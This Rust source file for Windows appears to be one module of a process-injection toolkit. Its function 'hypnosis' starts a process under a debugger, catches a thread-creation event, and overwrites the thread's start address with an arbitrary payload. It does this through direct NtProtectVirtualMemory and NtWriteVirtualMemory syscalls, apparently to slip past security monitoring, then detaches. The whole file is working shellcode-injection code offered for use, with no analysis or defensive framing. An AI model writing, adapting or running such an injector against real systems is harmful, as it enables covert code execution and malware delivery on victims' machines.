use core::mem::zeroed;
use windows_sys::Win32::{
    Foundation::DBG_CONTINUE,
    System::{
        Diagnostics::Debug::{
            CREATE_THREAD_DEBUG_EVENT, ContinueDebugEvent, DEBUG_EVENT, DebugActiveProcessStop,
            WaitForDebugEvent,
        },
        Threading::PROCESS_INFORMATION,
        WindowsProgramming::INFINITE,
    },
};

use super::super::process_utils::*;
use crate::{log, syscall};

pub unsafe fn hypnosis(payload: &[u8]) {
    unsafe {
        let pi = create_process(false, true, false).unwrap();
        let mut debug_info: DEBUG_EVENT = zeroed();
        loop {
            if WaitForDebugEvent(&mut debug_info, INFINITE) == 0 {
                log!("WaitForDebugEvent failed, breaking loop.");
                break;
            }

            match debug_info.dwDebugEventCode {
                CREATE_THREAD_DEBUG_EVENT => {
                    let base_addr = debug_info.u.CreateProcessInfo.lpStartAddress.unwrap() as usize;
                    let mut region_base = base_addr as usize;
                    let mut region_size = payload.len();
                    let mut old_protect: u32 = 0;

                    // 1. Make region writable and executable
                    let status = syscall!(
                        "NtProtectVirtualMemory",
                        pi.hProcess as usize,
                        &mut region_base as *mut usize as usize,
                        &mut region_size as *mut usize as usize,
                        windows_sys::Win32::System::Memory::PAGE_READWRITE,
                        &mut old_protect as *mut u32 as usize
                    );

                    if status < 0 {
                        log!("NtProtectVirtualMemory failed: 0x{:X}", status);
                        terminate(pi.hProcess);
                        return;
                    }

                    let mut region_base = base_addr as usize;
                    let mut region_size = payload.len();

                    // 2. Write payload
                    let mut bytes_written: u32 = 0;
                    let status = syscall!(
                        "NtWriteVirtualMemory",
                        pi.hProcess as usize,
                        base_addr as usize,
                        payload.as_ptr() as usize,
                        region_size as u32 as usize,
                        &mut bytes_written as *mut u32 as usize
                    );

                    if status < 0 {
                        log!("NtWriteVirtualMemory failed: 0x{:X}", status);
                        terminate(pi.hProcess);
                        return;
                    }

                    // 3. Restore old protection
                    let status = syscall!(
                        "NtProtectVirtualMemory",
                        pi.hProcess as usize,
                        &mut region_base as *mut usize as usize,
                        &mut region_size as *mut usize as usize,
                        old_protect,
                        &mut old_protect as *mut u32 as usize
                    );

                    if status < 0 {
                        log!("NtProtectVirtualMemory failed: 0x{:X}", status);
                        terminate(pi.hProcess);
                        return;
                    }

                    log!("Payload injected successfully.");
                    stop_debug(&pi);
                    break; // exit debug loop
                }

                _ => {
                    // Continue for other events
                    ContinueDebugEvent(debug_info.dwProcessId, debug_info.dwThreadId, DBG_CONTINUE);
                }
            }
        }
    }
}

unsafe fn stop_debug(pi: &PROCESS_INFORMATION) {
    unsafe {
        DebugActiveProcessStop(pi.dwProcessId);
        ContinueDebugEvent(pi.dwProcessId, pi.dwThreadId, DBG_CONTINUE);
        log!("Debugging stopped for target process.");
    }
}
